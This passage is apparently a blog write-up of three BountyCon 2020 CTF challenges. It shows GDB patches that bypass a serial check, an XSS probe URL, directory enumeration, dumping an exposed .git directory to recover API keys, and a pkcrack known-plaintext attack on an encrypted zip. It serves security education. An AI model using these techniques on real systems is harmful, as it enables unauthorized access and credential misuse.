<p>You'll find the serial key affects how the text/graphic/animation in the window is rendered, meaning it'll render the flag only when you provide it a serial key that is both valid and computes to eventually represent the flag.</p>



<p>When I found the whitelisted characters string in Ghidra (<code class="highlighter-rouge">FACE20TW3NY1456789DGHJKLMPQRSUXZ</code>), I thought the correct serial would be meaningful, something like <code class="highlighter-rouge">FACE-800K-20TW-3NTY</code> (FACEBOOK 2020). I wrote a Python script to generate all combinations of serials composed of words like FACE800K, F8, 20, TW3NY, TW3NTY, 80UNTY, C0N. After filtering out the serials that didn't validate, I manually checked out the serials that validated but none of them rendered the whole flag. Some of them did however render a small part correctly (like "Bount").</p>



<p>I debugged aglet with <a href="https://www.gnu.org/software/gdb/">GDB</a> (and <a href="https://github.com/hugsy/gef">GEF</a>) and experimented with different parts of the program. Like to make it accept any serial, you can enter the following commands:</p>


<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">break</span> <span class="k">*</span>0x40171e <span class="c"># set a breakpoint on the final if statement that validates the serial</span>
<span class="nb">command </span>1       <span class="c"># command that should run when the previous breakpoint hits (#1)</span>
j <span class="k">*</span>0x40172a     <span class="c"># jump to the instruction which is inside the if block</span>
end             <span class="c"># indicate no more commands to run for this breakpoint</span>
</code></pre></div></div>

<p>Inspect the source a bit further in Ghidra and you'll find the 16 characters in the serial key are transformed to 10 bytes. You'll find if two different serials (like <code class="highlighter-rouge">FFFF-FFFF-FFFF-FFFF</code> and <code class="highlighter-rouge">0000-0000-0000-0000</code>) get transformed into the same 10 intermediate bytes, the rendered graphic will be the same, meaning the actual serial doesn't matter because it gets reduced to these bytes.</p>



<p>To find the address of the 10 intermediate bytes, enter <code class="highlighter-rouge">break *0x4015e2</code> to set a breakpoint and when the breakpoint hits, enter <code class="highlighter-rouge">print $rbp-0x30</code> to print the address. You can print the bytes by entering <code class="highlighter-rouge">hexdump byte 0x7fffffffdef0 10</code> (where <code class="highlighter-rouge">0x7fffffffdef0</code> is the address)</p>



<p>I kept tweaking these 10 bytes with GDB (<code class="highlighter-rouge">set {char[10]}0x7fffffffdef0 = {0,0,0,0,0,0,0,0,0,0}</code>) and figured out each byte linearly affects a part of the rendered graphic. Editing the first few bytes will affect the leftmost part of the graphic and editing the last few bytes will affect the rightmost part of the graphic. This made me realize you could probably start at the first byte, keep incrementing it until the leftmost part of the graphic visually looks correct to you, then move to the second byte, keep incrementing it until the graphic looks more correct and repeat this process for the remaining bytes until the graphic finally renders the flag. This was time consuming of course even if you could script it since it required you to manually validate how correct the rendered graphic was.</p>



<p>I wrote a GDB script in Python to make the process easier:</p>


<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">LOG_FILE</span> <span class="o">=</span> <span class="s">'/tmp/gdb.log'</span>

<span class="n">breakpoints</span> <span class="o">=</span> <span class="p">[</span>
  <span class="s">'*0x4016fd'</span><span class="p">,</span>
<span class="p">]</span>

<span class="n">INTERMEDIATE_ADDRESS</span> <span class="o">=</span> <span class="s">'0x7fffffffdef0'</span>

<span class="k">def</span> <span class="nf">setup</span><span class="p">():</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'set pagination off'</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'set print pretty'</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'set logging file '</span> <span class="o">+</span> <span class="n">LOG_FILE</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'set logging on'</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'show script-extension'</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'show sysroot'</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'show solib-search-path'</span><span class="p">)</span>

<span class="c1"># start at:
# intermediate = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
# finally arrive at:
</span><span class="n">intermediate</span> <span class="o">=</span> <span class="p">[</span><span class="mi">161</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">148</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">180</span><span class="p">,</span> <span class="mi">129</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">new_interm</span><span class="p">():</span>
  <span class="k">return</span> <span class="s">','</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">intermediate</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">stop_handler</span><span class="p">(</span><span class="n">event</span><span class="p">):</span>
  <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">gdb</span><span class="o">.</span><span class="n">SignalEvent</span><span class="p">):</span>
    <span class="n">next_byte</span><span class="p">()</span>
    <span class="k">return</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">gdb</span><span class="o">.</span><span class="n">BreakpointEvent</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'EVENT:'</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="nb">type</span><span class="p">(</span><span class="n">event</span><span class="p">))</span>
    <span class="k">return</span>
  <span class="c1"># modify serial intermediate bytes
</span>  <span class="k">if</span> <span class="n">event</span><span class="o">.</span><span class="n">breakpoint</span><span class="o">.</span><span class="n">location</span> <span class="o">==</span> <span class="s">'*0x4016fd'</span><span class="p">:</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'set {char[10]}'</span> <span class="o">+</span> <span class="n">INTERMEDIATE_ADDRESS</span> <span class="o">+</span> <span class="s">' = {'</span> <span class="o">+</span> <span class="n">new_interm</span><span class="p">()</span> <span class="o">+</span> <span class="s">'}'</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'continue'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setup_breakpoints</span><span class="p">():</span>
  <span class="k">for</span> <span class="n">address</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">gdb</span><span class="o">.</span><span class="n">Breakpoint</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="s">'Error inserting breakpoint </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="p">(</span><span class="n">address</span><span class="p">))</span>

<span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">current_byte</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">def</span> <span class="nf">next_byte</span><span class="p">():</span>
  <span class="k">global</span> <span class="n">current_byte</span><span class="p">,</span> <span class="n">index</span>
  <span class="k">if</span> <span class="n">current_byte</span> <span class="o">&gt;</span> <span class="mi">255</span><span class="p">:</span>
    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">current_byte</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="n">current_byte</span> <span class="o">+=</span> <span class="mi">1</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'TRYING'</span><span class="p">,</span> <span class="n">current_byte</span><span class="p">,</span> <span class="s">'for index'</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="s">'| hex:'</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">current_byte</span><span class="p">))</span>
  <span class="n">intermediate</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">current_byte</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'r FFFF-FFFF-FFFF-FFFF'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
  <span class="n">setup</span><span class="p">()</span>
  <span class="n">setup_breakpoints</span><span class="p">()</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">events</span><span class="o">.</span><span class="n">stop</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">stop_handler</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'gef config context.layout ""'</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s">'r FFFF-FFFF-FFFF-FFFF'</span><span class="p">)</span>

<span class="n">main</span><span class="p">()</span>
</code></pre></div></div>
<p>To run the script, enter <code class="highlighter-rouge">source script.py</code> in GDB. When you want to stop and move on to the next byte, kill the gdb process, edit the <code class="highlighter-rouge">index</code> variable and the <code class="highlighter-rouge">intermediate</code> array in the script and run GDB again.</p>



<p>Eventually you'll find the final 10 bytes that correctly render the graphic look something like: <code class="highlighter-rouge">[161, 13, 161, 65, 148, 226, 68, 14, 180, 129]</code>. Each index in the array can have multiple correct values since it does some computation and reduces them.</p>



<p><img src="/--/bountycon20/aglet/flag1.png" alt="aglet Flag A" />
<img src="/--/bountycon20/aglet/flag2.png" alt="aglet Flag B" /></p>



<blockquote>
  <p>BountyCon{v3rt5_4nd_SDL2}</p>


</blockquote>

<p>"verts" in the flag probably refers to <a href="https://en.wikipedia.org/wiki/Vertex_(geometry)">vertex/vertices</a> and <a href="https://www.libsdl.org/">SDL2</a> of course refers to the library.</p>



<p>There are some other random things you can do in aglet with GDB:</p>



<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Disable drawing pink outline around the text</span>
<span class="nb">set</span> <span class="o">{</span>char[5]<span class="o">}</span>0x401c7e <span class="o">=</span> <span class="o">{</span>0x90, 0x90, 0x90, 0x90, 0x90<span class="o">}</span>
<span class="c"># Disable drawing random color inside the text</span>
<span class="nb">set</span> <span class="o">{</span>char[5]<span class="o">}</span>0x401ce0 <span class="o">=</span> <span class="o">{</span>0x90, 0x90, 0x90, 0x90, 0x90<span class="o">}</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">0x90</code> is the NOP instruction.</p>



<h3 id="gluebar--web--published-jan-2">Glue.bar â Web â published Jan 2</h3>

<blockquote>
  <p>Ever wanted to share 20 KiB of text (or less) with a friend but just couldn't? Enter Glue.bar, the original text-sharing application!</p>



  <p><a href="https://www.glue.bar/">https://www.glue.bar/</a></p>


</blockquote>

<p>TL;DR: Subdomain enumeration, directory enumeration, dump .git</p>



<p><img src="/--/bountycon20/gluebar/landing.png" alt="Glue.bar" /></p>



<p>Glue.bar is a Pastebin.com clone of course, don't believe the description. You can create a "glue" which will lead you to a link like:</p>



<p><a href="https://glue.bar/?glue=abcdefgh12345678">https://glue.bar/?glue=abcdefgh12345678</a></p>



<p>The <code class="highlighter-rouge">glue</code> param accepts the ID of the glue that you're viewing. It's alphanumeric and 16 chars long, so if you were to try brute force, the total number of glues you'd have to fetch would be 36^16.</p>



<p>You can try tweaking the <code class="highlighter-rouge">glue=</code> param and if it's not 16 chars in length, it'll say "The URL is incorrect or the glue was deleted".</p>



<p>This param is also vulnerable to XSS:</p>



<p><a href="https://glue.bar/?glue=%22%3E%3Cs%3E12345678901">https://glue.bar/?glue=%22%3E%3Cs%3E12345678901</a></p>



<p><img src="/--/bountycon20/gluebar/xss.png" alt="Glue.bar XSS" /></p>



<p>Since you're restricted to 16 characters, it's not of any use.</p>



<p>Check out the other pages of the site and you'll see mentions of a "Star supporter" who can see glues without a direct link and has access to some API:</p>



<p><img src="/--/bountycon20/gluebar/pricing.png" alt="Glue.bar Pricing" />
<img src="/--/bountycon20/gluebar/faq.png" alt="Glue.bar FAQ" /></p>



<p>Since there is nothing much to go on, you can try recon by enumerating directories and subdomains. One of the ways subdomain enumerators work is by checking if the current TLS certificate includes any subdomains. Look at the certificate and you'll find two new subdomains: api.glue.bar and starclient.glue.bar</p>



<p><img src="/--/bountycon20/gluebar/cert.png" alt="Glue.bar cert" height="307" /></p>



<p>The <code class="highlighter-rouge">api</code> subdomain simply returns:</p>


<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="s2">"success"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="s2">"error"</span><span class="p">:</span><span class="s2">"API key missing"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>The <code class="highlighter-rouge">starclient</code> subdomain however leads you to a Python script <a href="/--/bountycon20/gluebar/client.py"><code class="highlighter-rouge">client.py</code></a> that can access the API:</p>



<p><img src="/--/bountycon20/gluebar/starclient.png" alt="starclient.glue.bar" height="182" /></p>



<p>Inspect the source of <code class="highlighter-rouge">client.py</code> and you'll find that it requires an API key to function. Since you don't have an API key you can try fuzzing the parameters. I tried that and it led me nowhere.</p>



<p>Continue with recon and enumerate directories. Use <a href="https://github.com/stefanoj3/dirstalk">dirstalk</a> or any other tool of your choice. Most tools require you to provide the wordlist to enumerate. <a href="https://github.com/danielmiessler/SecLists">SecLists</a> and <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a> are popular repos with a lot of wordlists. Use the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt"><code class="highlighter-rouge">common.txt</code></a> wordlist and scan all three subdomains:</p>



<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./dirstalk scan https://starclient.glue.bar/ <span class="nt">--dictionary</span> SecLists/Discovery/Web-Content/common.txt
./dirstalk scan https://api.glue.bar/ <span class="nt">--dictionary</span> SecLists/Discovery/Web-Content/common.txt
./dirstalk scan https://www.glue.bar/ <span class="nt">--dictionary</span> SecLists/Discovery/Web-Content/common.txt
</code></pre></div></div>

<p>You'll find that <code class="highlighter-rouge">.git/HEAD</code> exists (you may also find <code class="highlighter-rouge">config.php</code> and <code class="highlighter-rouge">db.php</code> but they're just regular files):</p>



<blockquote>
  <p>INFO Found  method=GET status-code=200 url="https://starclient.glue.bar/.git/HEAD"</p>


</blockquote>

<p>This means the git repository has been uploaded containing the commit history. This happens a lot in the real world where developers unknowningly deploy the <code class="highlighter-rouge">.git</code> directory.</p>



<p>You can use <a href="https://github.com/internetwache/GitTools">Dumper in GitTools</a> to download all files from the .git directory:</p>



<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./gitdumper.sh https://starclient.glue.bar/.git/ ~/glue-bar/
</code></pre></div></div>

<p>Some git dumping tools won't download all the files and this might get you stuck in a few steps.</p>



<p>After dumping, use <a href="https://github.com/internetwache/GitTools">Extractor in GitTools</a> to extract the commits to separate directories:</p>



<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./extractor.sh ~/glue-bar/ glue-bar-extracted/
</code></pre></div></div>

<p>In the <code class="highlighter-rouge">glue-bar-extracted</code> directory, you'll find commits containing different versions of <code class="highlighter-rouge">client.py</code>. Go through them and you'll find commit <code class="highlighter-rouge">21ca8a32</code> has an API key:</p>


<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">apiKey</span> <span class="o">=</span> <span class="s">"6it1vbsfhn8odbrm71odj8e0h0rbeng0rybxornl"</span>
</code></pre></div></div>

<p>Try running <code class="highlighter-rouge">client.py</code> with that key:</p>


<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 client.py <span class="nt">--url</span> https://api.glue.bar <span class="nt">--key</span> 6it1vbsfhn8odbrm71odj8e0h0rbeng0rybxornl browse <span class="nt">--author</span> admin
</code></pre></div></div>

<p>You'll see that it says "Request failed!". Since the script doesn't output the reason why it failed, you can modify it by adding <code class="highlighter-rouge">print(response)</code> after <code class="highlighter-rouge">print("Request failed!")</code>. Run the command again and it'll say:</p>


<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Request failed!
{'success': False, 'error': 'Action not allowed for API key'}
</code></pre></div></div>

<p>This means the API key doesn't have privileges to perform the <code class="highlighter-rouge">browse</code> command. Maybe there's another API key? Look through the commits again and you'll find commit <code class="highlighter-rouge">b8905ee6</code> with another API key:</p>


<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"key"</span><span class="p">:</span> <span class="s">"etsvb53tvxxk17umf86o6xp1pzgj46clw386kgf7"</span> <span class="c1"># args.apiKey,
</span></code></pre></div></div>

<p>Run the client with the new key:</p>


<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 client.py <span class="nt">--url</span> https://api.glue.bar <span class="nt">--key</span> etsvb53tvxxk17umf86o6xp1pzgj46clw386kgf7 browse <span class="nt">--author</span> admin
</code></pre></div></div>

<p>It'll work and output all the glues with the author field set to "admin":</p>


<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Results:
========
link             | author | title
5512w5jmeq3sjzsq | admin | Test glue
8rqowk3l327jv6pe | admin | Glue.bar test
8yhzvjtomxyj50qb | Admin | hacker
1yc1m0fcllye4drn | admin | hacker
sqmpn9y09c6welkf | Admin | Untitled glue
pxcd2m3tqz7yt1zu | admin | Untitled glue
42gsmq8kv48ew47n | admin | eef
jfguhnyet8gc6okm | admin | &lt;img src="7aig0zsm23huiey66efcwbem7dd41t.burpcollaborator.net"&gt;
zk0gxcapuos5szpa | admin | Untitled glue
lsryop5ih2ljly9l | admin | ls;
</code></pre></div></div>

<p>You can enumerate different usernames and get the 10 oldest glues with this but you won't find the glue that contains the flag.</p>



<p>Take a look at <code class="highlighter-rouge">client.py</code> and check out how the request is constructed. You'll find requests contain a <code class="highlighter-rouge">filters</code> param that contains the field name and the field value:</p>



<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">filters</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="s">"author"</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">author</span><span class="p">])</span>
<span class="o">...</span>
<span class="n">filters</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="s">"title"</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">title</span><span class="p">])</span>
</code></pre></div></div>
<p>Try tweaking the <code class="highlighter-rouge">filters</code> param and you'll get different error messages:</p>


<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># when the filters arg isn't present
</span><span class="p">{</span><span class="s">'success'</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span> <span class="s">'error'</span><span class="p">:</span> <span class="s">'No filters specified'</span><span class="p">}</span>
<span class="c1"># when the filters arg isn't an array
</span><span class="p">{</span><span class="s">'success'</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span> <span class="s">'error'</span><span class="p">:</span> <span class="s">'Invalid filters'</span><span class="p">}</span>
<span class="c1"># when a filter array doesn't contain field name or value, or has extra values
</span><span class="p">{</span><span class="s">'success'</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span> <span class="s">'error'</span><span class="p">:</span> <span class="s">'Invalid filter'</span><span class="p">}</span>
<span class="c1"># when the field name of a filter doesn't exist in the database
</span><span class="p">{</span><span class="s">'success'</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span> <span class="s">'error'</span><span class="p">:</span> <span class="s">'Invalid filter column'</span><span class="p">}</span>
<span class="c1"># when the field value of a filter isn't a string
</span><span class="p">{</span><span class="s">'success'</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span> <span class="s">'error'</span><span class="p">:</span> <span class="s">'Invalid filter value'</span><span class="p">}</span>
</code></pre></div></div>

<p>The descriptive error messages are a clue to dig deeper. What if glues have a field named <code class="highlighter-rouge">has_flag</code> or <code class="highlighter-rouge">id</code>? Change <code class="highlighter-rouge">filters.append(["author", args.author])</code> to <code class="highlighter-rouge">filters.append(["has_flag", args.author])</code> and run the previous command again to find out. It'll say "Invalid filter column" which means the <code class="highlighter-rouge">has_flag</code> field doesn't exist.</p>



<p>Change the line to <code class="highlighter-rouge">filters.append(["id", args.author])</code> and run:</p>


<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="n">client</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">url</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">api</span><span class="o">.</span><span class="n">glue</span><span class="o">.</span><span class="n">bar</span> <span class="o">--</span><span class="n">key</span> <span class="n">etsvb53tvxxk17umf86o6xp1pzgj46clw386kgf7</span> <span class="n">browse</span> <span class="o">--</span><span class="n">author</span> <span class="mi">0</span>
</code></pre></div></div>
<p>It'll succeed but not return any results. When it didn't return any results I thought this is a dead end. Only after trying out a few different things, I tried this again with ID #1 or something and it returned a single glue. They probably deliberately thought of this and added an extra bump to go through.</p>



<p>Try out numbers 1 to 3 for <code class="highlighter-rouge">--author</code> and finally for ID #3, you'll find the glue that has the flag:</p>


<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Results:
========
link             | author | title
75qlwbza1h3lc8vg | flagbearer6372 | Have yourself a flag
</code></pre></div></div>
<p>Construct the URL for that glue and open it in your browser or simply use the client's get command:</p>



<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 client.py <span class="nt">--url</span> https://api.glue.bar <span class="nt">--key</span> etsvb53tvxxk17umf86o6xp1pzgj46clw386kgf7 get 75qlwbza1h3lc8vg
Glue found:
<span class="o">===========</span>

Created: 2018-05-09 13:37:37
Author:  flagbearer6372
Title:   Have yourself a flag

BountyCon<span class="o">{</span>d0nt_f0rget_the_5745H<span class="o">}</span>
</code></pre></div></div>

<h3 id="matts-string-reverser--web--published-jan-6">Matt's String Reverser â Web â published Jan 6</h3>

<blockquote>
  <p>Back in the 90's, string reversing was not as easy as [::-1]. Glue.bar has unearthed Matt's legacy after more than 20 years and are providing his legendary software free of charge.</p>



  <p>https://www.glue.bar/mattsstringreverser/</p>



  <p>Note: this challenge is not related to Glue.bar at all</p>


</blockquote>

<p>TL;DR: Recon with <a href="https://archive.org/web/">Wayback Machine</a>, run exiftool on the .jpg, crack .zip password with <a href="https://github.com/keyunluo/pkcrack">pkcrack</a></p>



<p><img src="/--/bountycon20/msr/msr.png" alt="Matt's String Reverser" /></p>



<p>As the description suggests, the webpage looks like it was designed in the 90s. The string reversing functionality and "written in PHP" is a red herring and there is no special input that will get you anywhere (believe me, I went down that rabbit hole for a long time).</p>



<p>You'll see some strikethrough text and an update below, suggesting Matt edited the webpage and the previous version had the link to the demo version. Now you just need to find some way to get the previous version of the webpage. You can google <code class="highlighter-rouge">cache:https://www.glue.bar/mattsstringreverser/</code> to get Google's cached copy but Google doesn't have it. The other more popular site that archives webpages is <a href="https://archive.org/web/">The Wayback Machine</a> which has a few copies of Matt's webpage.</p>



<p><a href="http://web.archive.org/web/20191231221341/https://www.glue.bar/mattsstringreverser/">This copy</a> has the link to the demo version's source:</p>



<p><a href="https://www.glue.bar/mattsstringreverser/demo_source_v13.zip">https://www.glue.bar/mattsstringreverser/demo_source_v13.zip</a></p>



<p>Inside <a href="/--/bountycon20/msr/demo_source_v13.zip">the zip</a> you'll find an <code class="highlighter-rouge">index.php</code> file which says:</p>



<blockquote>
  <p>Here is a present for using the demo version: gpj.flesmih-ttam/resrevergnirtssttam/rab.eulg.www//:sptth - you will need to use the full version of Matt's String Reverser to collect the present ;)</p>


</blockquote>

<p>Reverse the string to get the link:</p>



<p><a href="https://www.glue.bar/mattsstringreverser/matt-himself.jpg">https://www.glue.bar/mattsstringreverser/matt-himself.jpg</a></p>



<p>On <a href="/--/bountycon20/msr/matt-himself.jpg">this jpg file</a>, you can either run <code class="highlighter-rouge">strings matt-himself.jpg</code> or <code class="highlighter-rouge">exiftool matt-himself.jpg</code>, which will lead you to:</p>



<blockquote>
  <p>===== piz.weiverp-terces-2noisrev =====</p>


</blockquote>

<p>Reverse it again to get:</p>



<p><code class="highlighter-rouge">version2-secret-preview.zip</code></p>



<p><a href="/--/bountycon20/msr/version2-secret-preview.zip">Download the file</a> from:</p>



<p><a href="https://www.glue.bar/mattsstringreverser/version2-secret-preview.zip">https://www.glue.bar/mattsstringreverser/version2-secret-preview.zip</a></p>



<p>This zip file is the final "level" of this challenge and you won't have to deal with "the flag is in another castle" any more. Trying to unzip the file will tell you that the files inside are encrypted with a password. You can run <code class="highlighter-rouge">unzip -vl version2-secret-preview.zip</code> to check out the zip contents:</p>


<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Archive:  version2-secret-preview.zip
 Length   Method    Size  Cmpr    Date    Time   CRC-32   Name
--------  ------  ------- ---- ---------- ----- --------  ----
       0  Stored        0   0% 01-01-2020 03:09 00000000  ver2/
    1578  Defl:N      904  43% 01-01-2020 03:07 d0d3ab4c  ver2/index.php
    8096  Defl:N     7864   3% 01-01-2020 02:49 3ce3e1fd  ver2/matt-himself.jpg
--------          -------  ---                            -------
    9674             8768   9%                            3 files
</code></pre></div></div>

<p>You already downloaded <code class="highlighter-rouge">matt-himself.jpg</code> earlier but it's still included in the zip, why did they include it then? There are multiple ways of cracking a zip password and one of the simpler ways is to do a known plaintext attack, which is possible if you have a file that's inside the zip.</p>



<p><a href="https://github.com/keyunluo/pkcrack">pkcrack</a> is one of the tools that can do this job. The command isn't very intuitive and it took me some time to formulate the correct command.</p>



<p>First zip <code class="highlighter-rouge">matt-himself.jpg</code> by running <code class="highlighter-rouge">zip -r matt-himself.zip matt-himself.jpg</code></p>



<p>Now you can run pkcrack:</p>


<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pkcrack <span class="nt">-C</span> version2-secret-preview.zip <span class="nt">-c</span> ver2/matt-himself.jpg <span class="nt">-P</span> matt-himself.zip <span class="nt">-p</span> matt-himself.jpg <span class="nt">-d</span> cracked.zip <span class="nt">-a</span>
</code></pre></div></div>

<p>Unzip <code class="highlighter-rouge">cracked.zip</code> and open <code class="highlighter-rouge">ver2/index.php</code>, you'll see some gibberish code:</p>



<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">echo</span> <span class="s2">"^l7Ij-%f(#8#l</span><span class="se">\x15</span><span class="s2">Y</span><span class="se">\x1B</span><span class="s2">E%</span><span class="se">\x1E</span><span class="s2">.8}Igx</span><span class="se">\\\x14</span><span class="s2">!Zf}"</span>
  <span class="o">^</span> <span class="s2">"K=REz</span><span class="se">\x15\x1C</span><span class="s2">=i</span><span class="se">\x1B\x14</span><span class="s2">/Kw=</span><span class="se">\x1B\$</span><span class="s2">Zw!WIvQkus/f</span><span class="se">\x18</span><span class="s2">a"</span>
  <span class="o">^</span> <span class="s2">"W&gt;</span><span class="se">\x10</span><span class="s2">bdAz4/CE;T=Un&gt;</span><span class="se">\x0B\x01</span><span class="s2">&lt;0</span><span class="se">\x00</span><span class="s2">MU{\x18</span><span class="se">\x11</span><span class="s2">=F</span><span class="se">\x04</span><span class="s2">a"</span><span class="p">;</span>
</code></pre></div></div>

<p>Copy these lines to a new PHP file called <code class="highlighter-rouge">flag.php</code> (make sure to prepend <code class="highlighter-rouge"><span class="cp">&lt;?php</span></code> at the top) and run <code class="highlighter-rouge">php flag.php</code> to get the flag:</p>



<blockquote>
  <p>BountyCon{i7s_1n_th3_4rch1v3zz}</p>


</blockquote>

<p>You can also run <code class="highlighter-rouge">index.php</code> directly on localhost by running <code class="highlighter-rouge">php -S localhost:1337 ver2/index.php</code>. Go to <code class="highlighter-rouge">localhost:1337</code> and submit any string to get the flag.</p>



<h3 id="flags-page-enhancement-userscript">Flags Page Enhancement Userscript</h3>

<p>Like last time, I wrote an userscript to enhance the flags page:
<a href="/--/bountycon20/flagspage-normal.png" target="_blank"><img src="/--/bountycon20/flagspage-normal.png" width="300" alt="Flags Page Normal" /></a>
<a href="/--/bountycon20/flagspage-enhanced.png" target="_blank"><img src="/--/bountycon20/flagspage-enhanced.png" width="300" alt="Flags Page Enhanced" /></a></p>



<p>It sorted the flags by points, added some numbers and refreshed the page every hour.</p>



<p>If you'd like to install it, install <a href="https://tampermonkey.net/">Tampermonkey</a> then <a href="https://gist.githubusercontent.com/KishanBagaria/e4701505c4a38d85fbb2db8d33d75eff/raw/BC2020FPE.user.js">click this link</a></p>



<h3 id="other-write-ups">Other write-ups</h3>

<ul>
  <li><a href="https://www.youtube.com/watch?v=qIZO5VBMRfk&amp;list=PLXH0FCWZpUCpYaYWM11mU-Fnv8DKyqK-3">Heart of Stone, I Don't Play, Not a Speck, Proof-of-Game, Glue.bar, Meggenser (in Nepali) [Santosh Bhandari]</a></li>
  <li><a href="http://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/">Heart of Stone, Tick Tock, Who's Sequel, Lighthouse, Shake It [Shoeb Patel]</a></li>
  <li><a href="https://tripoloski1337.github.io/ctf/2020/01/26/secure-login-facebook-bountycon.html">Secure Login [Arsalan Diponegoro]</a></li>
</ul>

<p>If you publish a write-up or find one, let me know and I'll link to it here.</p>



<!--
ee4d2f18d290a7aaf473e0ec63665205d4d05ee9  aglet.tar.gz
0fbf60928bc540c0d7ccd0255cbdba11ffcde166  anti_what.tar.gz
